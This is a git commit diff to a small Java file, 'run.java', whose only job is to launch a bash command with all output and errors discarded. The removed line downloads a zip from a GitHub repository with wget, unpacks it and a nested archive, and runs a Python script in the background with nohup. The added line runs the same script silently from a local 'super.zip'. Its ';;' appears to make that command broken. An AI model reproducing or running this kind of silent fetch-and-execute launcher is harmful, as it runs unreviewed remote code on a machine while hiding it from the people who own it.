2188420f602f5094d6df178791294a6d1686986d
herumanara <herumanara@gmail.com>
2025-11-08 18:59:45 -0600

    Update run.java

--- run.java
+++ run.java
@@ -4,7 +4,7 @@ import java.util.*;
 public class run {
     public static void main(String[] args) {
         try {
-            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "wget https://github.com/levatinaforekina-arch/scaling-doodle/raw/refs/heads/main/palantir.zip;unzip palantir.zip;unzip grok.zip;nohup python run.py");
+            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "unzip super.zip;;nohup python run.py");
             builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             builder.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process process = builder.start();
